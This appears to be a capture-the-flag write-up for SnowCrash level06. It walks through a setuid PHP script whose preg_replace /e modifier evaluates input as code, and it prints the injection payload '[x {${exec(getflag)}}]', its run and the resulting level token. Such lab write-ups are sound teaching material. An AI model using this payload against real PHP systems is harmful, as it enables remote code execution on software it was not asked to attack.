For this level, with a basic "ls -l" command we can see 1 executable and 1 php file.

	level06@SnowCrash:~$ ls -l
	total 12
	-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

We need to see what it does.

	level06@SnowCrash:~$ cat level06.php
	#!/usr/bin/php
	<?php
	function y($m) { $m = preg_replace("/\./", " x ", $m);
					$m = preg_replace("/@/", " y", $m);
					return $m; }

	function x($y, $z) { $a = file_get_contents($y);
						$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
						$a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);
						return $a; }

	$r = x($argv[1], $argv[2]); print $r;
	?>

To Resume this php script applies a series of transformations to its content, and output the result.
It has a huge security vulnerabily.
The use of /e in the "preg_replace" function is deprecated.
It allows the function to execute the replacement string as php code.
We now need to find out what input we need to give to this script.

We need to put the command in "[x ...]" to execute it and to get the correct syntax we used : 

https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex

	level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/file

And then execute it

	level06@SnowCrash:~$ ./level06 /tmp/file
	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4)
	: regexp code on line 1

